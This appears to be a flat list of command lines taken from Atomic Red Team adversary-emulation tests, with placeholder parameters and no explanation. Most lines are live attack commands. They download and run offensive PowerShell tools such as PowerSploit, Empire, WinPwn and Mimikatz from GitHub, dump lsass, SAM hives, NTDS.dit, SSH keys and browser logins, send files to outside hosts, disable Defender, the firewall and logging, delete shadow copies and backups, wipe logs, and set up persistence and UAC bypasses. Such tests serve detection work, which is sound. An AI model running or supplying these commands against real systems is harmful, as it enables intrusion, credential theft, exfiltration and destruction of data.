[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique Token -Verbose
kubectl create -f #{path} -n #{namespace}&&# wait 3 seconds for the instance to come up&&sleep 3&&kubectl exec -n #{namespace} busybox -- #{command}
pcalua.exe -a #{process};pcalua.exe -a #{payload_path}
echo "# THIS IS A COMMENT" >> /etc/ufw/sysctl.conf&&grep "# THIS IS A COMMENT" /etc/ufw/sysctl.conf
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1');Invoke-Seatbelt -Command "-group=all"; pause
systeminfo;reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum
openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name}
"PathToAtomicsFolder\..\ExternalPayloads\build\namedpipes_executor.exe" --pipe 2
Import-Module AADInternals -Force;Export-AADIntADFSCertificates;Get-ChildItem | Where-Object {$_ -like "ADFS*"};Write-Host "`nCertificates retrieved successfully"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');generaldomaininfo -noninteractive -consoleoutput
wmic /node:"#{target_host}" shadowcopy call create Volume=#{drive_letter}
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f
if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi&&if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i "Droplet\|HVM\|VirtualBox\|VMware"; fi&&if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i "Xen\|Bochs\|QEMU"; fi&&if [ -x "$(command -v dmidecode)" ]; then sudo dmidecode | grep -i "microsoft\|vmware\|virtualbox\|quemu\|domu"; fi&&if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i "vmware\|vbox"; fi&&if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i "vmware\|vbox\|qemu\|virtual"; fi&&if [ -x "$(command -v lspci)" ]; then sudo lspci | grep -i "vmware\|virtualbox"; fi&&if [ -x "$(command -v lscpu)" ]; then sudo lscpu | grep -i "Xen\|KVM\|Microsoft"; fi
cp #{bin_path} /tmp/packed_bin && /tmp/packed_bin
wmic.exe shadowcopy delete
Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}"
xwd -root -out #{output_file}&&xwud -in #{output_file}
which_python=`which python || which python3`&&$which_python -c "import bz2;input_file=open('#{path_to_input_file}','rb');content=input_file.read();input_file.close();bz2content=bz2.compress(content,compresslevel=9);output_file=open('#{path_to_output_file}','w+');output_file.write(str(bz2content));output_file.close();"
if (systemd-detect-virt) then echo "Virtualization Environment detected"; fi;&&if (sudo dmidecode | egrep -i 'manufacturer|product|vendor' | grep -iE 'Oracle|VirtualBox|VMWare|Parallels') then echo "Virtualization Environment detected"; fi;
Mount-DiskImage -ImagePath "#{path_of_iso}" -StorageType ISO -Access ReadOnly;$keep = Get-Volume -FileSystemLabel "TestIso";$driveLetter = ($keep | Get-Volume).DriveLetter;invoke-item "$($driveLetter):\hello.exe"
reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f;reg  add HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f;reg delete HKCU\Software\Policies\Microsoft\Windows\PowerShell /v EnableScripts /f >nul 2>&1
"#{procdump_exe}" -accepteula -mm lsass.exe #{output_file}
shutdown /l 
. "$PathToAtomicsFolder\T1055.012\src\Start-Hollow.ps1";$ppid=Get-Process #{parent_process_name} | select -expand id;Start-Hollow -Sponsor "#{sponsor_binary_path}" -Hollow "#{hollow_binary_path}" -ParentPID $ppid -Verbose
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc admincountdmp #{optional_args}
sudo sh -c "echo Defaults "'!'"tty_tickets >> /etc/sudoers"&&sudo visudo -c -f /etc/sudoers
sc create win32times binPath= "cmd /c start c:\T1036.004_NonExistingScript.ps1";sc qc win32times
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe";schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
schtasks.exe /Change /TN "\Microsoft\Windows\SystemRestore\SR" /disable
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
cat /etc/passwd > #{output_file}&&cat #{output_file}
mkdir .\tmp\victim-files;cd .\tmp\victim-files;echo "This file will be encrypted" > .\encrypted_file.txt;"#{rar_exe}" a -hp"blue" hello.rar;dir
&"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1" -LogPath #{filepath}
mkdir #{output_folder}&&find #{search_path} -type d -name '.gnupg' 2>/dev/null -exec rsync -Rr {} #{output_folder} \;&&exit 0
import-module msonline;$Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force;$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password;Connect-MsolService -Credential $Credential;$users = Get-MsolUser -All;;foreach($user in $users);{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; ;foreach($prop in $props);{if($user.$prop -like "*password*");{("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}};get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
unset HISTFILE&&export HISTFILESIZE=0&&history -c
Set-Location -path "#{file_path}\Sysinternals";;./accesschk.exe -accepteula .;
$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');MS17-10 -noninteractive -consoleoutput
localectl status
$credFile = "#{cred_file}";if (Test-Path $credFile) {;    $cred = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $env:USERNAME, (Get-Content $credFile | ConvertTo-SecureString);    if($cred.GetNetworkCredential().Password -eq "#{new_password}"){;      Write-Host -ForegroundColor Yellow "The new password is the same as the password stored in the credential file. Please specify a different new password."; exit -1;    };    try {;        $newPassword = ConvertTo-SecureString #{new_password} -AsPlainText -Force;        Set-ADAccountPassword -Identity $env:USERNAME -OldPassword $cred.password -NewPassword $newPassword;    };    catch { ;        $_.Exception;        $errCode = $_.Exception.ErrorCode;        Write-Host "Error code: $errCode";        if ($errCode -eq 86) {;            Write-Host -ForegroundColor Yellow "The stored password for the current user is incorrect. Please run the prereq commands to set the correct credentials";            Remove-Item $credFile;        };        exit $errCode;    };    Write-Host -ForegroundColor Cyan "Successfully changed the password to #{new_password}";    $newCred = New-Object System.Management.Automation.PSCredential ($env:USERNAME, $(ConvertTo-SecureString "#{new_password}" -AsPlainText -Force));    $newCred.Password | ConvertFrom-SecureString | Out-File $credFile;};else {;    Write-Host -ForegroundColor Yellow "You must store the password of the current user by running the prerequisite commands first";}
mkdir #{output_folder}&&find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;
aws iam create-group --group-name #{username}&&aws iam add-user-to-group --user-name #{username} --group-name #{username}
#{curl_path} -k -F "file=@#{input_file}" https://file.io/
python3 #{lazagne_path}/laZagne.py #{specific_module} >> #{output_file}
Out-ATHPowerShellCommandLineParameter -CommandLineSwitchType #{command_line_switch_type} -CommandParamVariation #{command_param_variation} -Execute -ErrorAction Stop
copy "#{filename}" %TEMP%\hello.js;#{jscpath}\#{jscname} %TEMP%\hello.js
copy %windir%\system32\certutil.exe %temp%\tcm.tmp;%temp%\tcm.tmp -encode #{executable} %temp%\T1140_calc2.txt;%temp%\tcm.tmp -decode %temp%\T1140_calc2.txt %temp%\T1140_calc2_decoded.exe
dd if=/dev/zero bs=1 count=1 >> #{file_to_pad} #adds null bytes&&dd if=/dev/random bs=1 count=1 >> #{file_to_pad} #adds high-quality random data&&dd if=/dev/urandom bs=1 count=1 >> #{file_to_pad} #adds low-quality random data
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
Set-Location "PathToAtomicsFolder";.\T1071.004\src\T1071-dns-domain-length.ps1 -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type}
Start-ATHProcessUnderSpecificParent -FilePath #{file_path} -CommandLine '#{command_line}' -ParentId #{parent_pid}
rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 "#{inf_to_execute}"
copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit;copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE;reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
New-SmbMapping -RemotePath '#{remote_path}' -TransportType QUIC -SkipCertificateCheck;copy '#{local_file}' 'Z:\'
#{curl_path} -k #{file_download} -o c:\users\public\music\allthethingsx64.dll;#{curl_path} -k #{file_download} --output c:\users\public\music\allthethingsx64.dll;#{curl_path} -k #{file_download} -o c:\programdata\allthethingsx64.dll;#{curl_path} -k #{file_download} -o %Temp%\allthethingsx64.dll
ps aux | egrep 'falcond|nessusd|cbagentd|td-agent|packetbeat|filebeat|auditbeat|osqueryd'
Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
del /f #{file_to_delete}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/08cbd274bef78243d7a8ed6443b8364acd1fc48b/data/module_source/credentials/Invoke-Kerberoast.ps1 -UseBasicParsing);Invoke-Kerberoast | fl
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoFileMenu /t REG_DWORD /d 1 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
reg.exe add hkcu\software\classes\mscfile\shell\open\command /ve /d "#{executable_binary}" /f;cmd.exe /c eventvwr.msc
"PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" -sc exchaddresses #{optional_args}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing);Invoke-Maldoc -macroFile "#{txt_path}" -officeProduct "Word" -sub "Execute"
fsutil usn deletejournal /D C:
wevtutil cl #{log_name}
ntdsutil "set dsrm password" "sync from domain account #{sync_account}" "q" "q"
SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}
echo T1486 - Purelocker Ransom Note > %USERPROFILE%\Desktop\YOUR_FILES.txt
cscript "#{vbscript}"
$content = Get-Content #{input_file};Invoke-WebRequest -Uri #{ip_address} -Method POST -Body $content
gpresult /z
net use c: #{share_name};net share test=#{share_name} /REMARK:"test share" /CACHE:No
for($i=0; $i -le #{query_volume}; $i++) { Resolve-DnsName -type "#{query_type}" "#{subdomain}-$(Get-Random -Minimum 1 -Maximum 999999).#{domain}" -QuickTimeout}
free && echo 3 > /proc/sys/vm/drop_caches && free&&echo 3> /proc/sys/vm/drop_caches 
Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat";Copy-Item "$PathToAtomicsFolder\T1547.001\src\batstartup.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat";Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat";Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
mkdir #{output_folder}&&find #{search_path} -name id_rsa 2>/dev/null -exec rsync -R {} #{output_folder} \;&&exit 0
copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe;copy "#{Path_inf}" %TEMP%\ieuinit.inf;%TEMP%\ie4uinit.exe -BaseSettings
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:"#{output_file}" /target:exe "#{source_file}";%tmp%/T1106.exe
C:\windows\system32\SyncAppvPublishingServer.vbs "\n;#{command_to_execute}"
sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin
New-ItemProperty -Path "HKLM:\Software\Microsoft\Command Processor" -Name "AutoRun" -Value "#{command}" -PropertyType "String"
wmic /node:#{node} process call create "rundll32.exe \"#{dll_to_execute}\" #{function_to_execute}"
copy \\#{remote}\C$\#{share_file} %TEMP%\#{local_file}
ps aux | egrep 'Little\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'
vssadmin.exe create shadow /for=#{drive_letter}
takeown.exe /f #{file_folder_to_own} /r
aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json&&echo "*** Log Group Created ***"&&aws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json&&echo "*** Log Group Deleted ***"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null;try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop};catch{ $_; exit $_.Exception.Response.StatusCode.Value__};get-process lsass | Out-Minidump
$RunKey = "#{reg_key_path}";Set-ItemProperty -Path $RunKey -Name "socks5_powershell" -Value "#{reg_key_value}"
cat /etc/security/pwquality.conf
try{$response = invoke-webrequest "https://#{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}" -method "GET"};catch [system.net.webexception];{if($_.Exception.Response -ne $null);{$Response = $_.Exception.Response.GetResponseStream();$ReadResponse = New-Object System.IO.StreamReader($Response);$ReadResponse.BaseStream.Position = 0;$responseBody = $ReadResponse.ReadToEnd()};else {$responseBody = "The storage account could not be anonymously accessed."}};"Response received for #{base_name}.blob.core.windows.net/#{container_name}/#{blob_name}: $responsebody" | out-file -filepath #{output_file} -append
if [ -f "/etc/#{syslog_config_file_name}" ];&&then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}&&fi
Remove-Item -Path #{folder_to_delete} -Recurse
wbadmin delete systemstatebackup -keepVersions:0
poweroff --reboot
sudo find /var/log -name '#{system_log_name1}.*' -exec rm {} \; #using "rm" execution&&sudo find /var/log/ -name "#{system_log_name2}.*" -exec shred -u -z -n 3 {} \; #using "shred" execution&&sudo find /var/log/ -name "#{system_log_name3}.*" -exec unlink {} \; #using "unlink" execution
"#{venv_path}\Scripts\adidnsdump" -u #{user_name} -p #{acct_pass} --print-zones #{host_name}
$malcmdlets = #{Malicious_cmdlets};foreach ($cmdlets in $malcmdlets) {;    "function $cmdlets { Write-Host Pretending to invoke $cmdlets }"};foreach ($cmdlets in $malcmdlets) {;    $cmdlets}
net.exe stop #{service_name};sc.exe config #{service_name} start= disabled
certutil -encode #{executable} %temp%\T1140_calc.txt;certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe
([adsisearcher]"objectcategory=group").FindAll(); ([adsisearcher]"objectcategory=group").FindOne()
echo $0&&if $(env |grep "SHELL" >/dev/null); then env |grep "SHELL"; fi&&if $(printenv SHELL >/dev/null); then printenv SHELL; fi
powershell.exe -exec bypass -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName #{module_name} -ModulePath #{module_path}
chmod +x #{linenum}&&bash #{linenum}
reg add "hklm\system\currentcontrolset\control\lsa" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0
net view \\#{computer_name}
REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid
sudo #{program_path} -a -t 3
Get-Service > $env:TEMP\T1119_1.txt;Get-ChildItem Env: > $env:TEMP\T1119_2.txt;Get-Process > $env:TEMP\T1119_3.txt
$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-AzAccount -Credential $creds;New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
$OriginalCommand = '#{powershell_command}';$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand);$EncodedCommand =[Convert]::ToBase64String($Bytes);$EncodedCommand;;Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand;powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
cat /etc/pam.d/passwd
grep 'x:0:' /etc/passwd > #{output_file}&&grep '*:0:' /etc/passwd >> #{output_file}&&cat #{output_file} 2>/dev/null
reg save HKLM\sam %temp%\sam;reg save HKLM\system %temp%\system;reg save HKLM\security %temp%\security
passwd #{user_account} #enter admin password > enter new password > confirm new password
pw useradd art -g wheel -s /bin/sh&&echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0&&pw lock art&&pw usermod art -e +1d&&pw unlock art&&pw user mod art -e +99d&&su art&&whoami&&exit
gcloud config set project #{project-id}&&gcloud iam service-accounts create #{service-account-name}&&gcloud iam service-accounts keys create #{output-key-file} --iam-account=#{service-account-email}
Get-adcomputer -SearchScope subtree -filter "name -like '*'" -Properties *
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows";reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices;reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify";reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit";reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell";reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell";reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce;reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run;reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run;reg query HKLM\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$";reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run;reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot;reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components";reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy\Scripts\Startup"
echo -n 111-11-1111 | base64&&curl -XPOST #{base64_data}.#{destination_url}
echo "" > #{history_path}
New-Item -ItemType Directory -path "#{new_startup_folder}";Copy-Item -path "#{payload}" -destination "#{new_startup_folder}";Set-ItemProperty -Path  "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Common Startup" -Value "#{new_startup_folder}"
wbadmin delete catalog -quiet
import -window root #{output_file}
osascript -e 'tell application "Finder" to delete POSIX file "#{system_log_path}"'
security find-certificate -a -p > #{cert_export}
%windir%\system32\inetsrv\appcmd.exe install module /name:#{module_name} /image:#{dll_path}
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f
$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"));$NewClass = $Class.Derive("#{new_class}");$NewClass.Put();Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
"#{uacme_exe}"
wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create #{process_to_execute}
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
reg add HKLM64\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f;reg add HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting /v DisableEnhancedNotifications /t REG_DWORD /d 1 /f
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing) ;Invoke-MalDoc -macroFile "PathToAtomicsFolder\T1055.012\src\T1055.012-macrocode.txt" -officeProduct "#{ms_product}" -sub "Exploit"
net view /domain;net view
ip route show
Invoke-CimMethod -ClassName Win32_Product -MethodName #{action} -Arguments @{ PackageLocation = '#{msi_payload}' }
net user #{guest_user} /active:yes
reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art&&su art&&cd /tmp&&curl -s #{remote_url} |bash
ps >> #{output_file}&&ps aux >> #{output_file}
Copy-Item "#{exe_file_path}" -Destination "C:\Users\$env:UserName" -Force;netsh advfirewall firewall add rule name="Atomic Test" dir=in action=allow program="C:\Users\$env:UserName\AtomicTest.exe" enable=yes
for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
sudo sed -i "" "#{index}s,^,#{pam_rule}\n,g" #{path_to_pam_conf}
New-Item -Path "#{output_path}" -ItemType Directory > $null;& "#{sharphound_path}" -d "#{domain}" --CollectionMethod LocalAdmin --NoSaveCache --OutputDirectory "#{output_path}"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;IEX (IWR 'https://raw.githubusercontent.com/dafthack/DomainPasswordSpray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/DomainPasswordSpray.ps1' -UseBasicParsing); Invoke-DomainPasswordSpray -Password Spring2017 -Domain #{domain} -Force
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" /v "DoNotConnectToWindowsUpdateInternetLocations" /t REG_DWORD /d 1 /f
$Action = New-ScheduledTaskAction -Execute "calc.exe";$Trigger = New-ScheduledTaskTrigger -AtLogon;$User = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel Highest;$Set = New-ScheduledTaskSettingsSet;$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set;Register-ScheduledTask AtomicTask -InputObject $object
Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, #{binary_to_execute}" -Force
copy "#{inputfile}" #{outputfile};try { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id };catch { $_; exit $_.Exception.HResult};Stop-Process -ID $myT1036_003
sh #{script_path}&&PID=$(pgrep -n -f "#{pid_term}")&&MEM_START=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f1)&&MEM_STOP=$(head -n 5 /proc/"${PID}"/map | tail -1 | cut -d' ' -f2)&&MEM_SIZE=$(echo $(($MEM_STOP-$MEM_START)))&&dd if=/proc/"${PID}"/mem of="#{output_file}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"&&strings "#{output_file}" | grep -i PASS
net accounts
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force;New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force;Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force;Start-Process "C:\Windows\System32\ComputerDefaults.exe"
New-Item "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components" -Name "atomic_test" -Force;Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" "(Default)" "ART TEST" -Force;Set-ItemProperty "HKLM:\SOFTWARE\Microsoft\Active Setup\Installed Components\atomic_test" "StubPath" "#{payload}" -Force ;& $env:SYSTEMROOT\system32\runonce.exe /AlternateShellStartup
username=$(id -u -n) && lsof -u $username
Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableBehaviorMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -DisableBlockAtFirstSeen 1
& "PathToAtomicsFolder\..\ExternalPayloads\Backstab64.exe" -k -n #{process_name}
mkdir #{output_folder};ntdsutil "ac i ntds" "ifm" "create full #{output_folder}" q q
echo #{library_path} | tee -a /etc/ld.so.preload&&/usr/local/bin/evil_script.py localhost -c 10 >/dev/null & pgrep -l evil_script.py || echo "process hidden"
sudo defaults write com.apple.loginwindow LoginHook #{script}
locale
sudo rm -rf #{syslog_path}&&if [ -d /var/audit ] ; then sudo rm -rf #{macos_audit_path} ; fi
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v HideSCAHealth /t REG_DWORD /d 1 /f
net user;dir c:\Users\;cmdkey.exe /list;net localgroup "Users";net localgroup
"#{psexec_path}" /accepteula \\#{machine} -c #{mimikatz_path} "lsadump::lsa /inject /id:500" "exit"
IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress #{server_ip}
sc.exe stop #{service_name}
shutdown -h #{timeout}
TEST=$(echo $HISTCONTROL)&&if [ "$HISTCONTROL" != "ignoreboth" ]; then export HISTCONTROL="ignoreboth"; fi&&history -c &&ls -la $HISTFILE # " ls -la $HISTFILE"&&if [ $(history |wc -l) -eq 1 ]; then echo "ls -la is not in history cache"; fi&&# -> ls -la is not in history cache&&if [ "$HISTCONTROL" != "erasedups" ]; then export HISTCONTROL="erasedups"; fi&&history -c &&ls -la $HISTFILE&&ls -la $HISTFILE&&ls -la $HISTFILE&&if [ $(history |wc -l) -eq 2 ]; then echo "Their is only one entry for ls -la $HISTFILE"; fi
IF NOT EXIST %windir%\System32\osk.exe.bak (copy %windir%\System32\osk.exe %windir%\System32\osk.exe.bak) ELSE ( pushd );takeown /F %windir%\System32\osk.exe /A;icacls %windir%\System32\osk.exe /grant Administrators:F /t;del %windir%\System32\osk.exe;mklink %windir%\System32\osk.exe %windir%\System32\cmd.exe
cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f;cmd.exe /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f;cmd.exe /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f
nltest /domain_trusts;nltest /trusted_domains
echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename};for /f "usebackq delims=?" %i in (#{file_name}:#{ads_filename}) do %i
osascript -e 'do shell script "rm #{system_log_path}" with administrator privileges'
IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
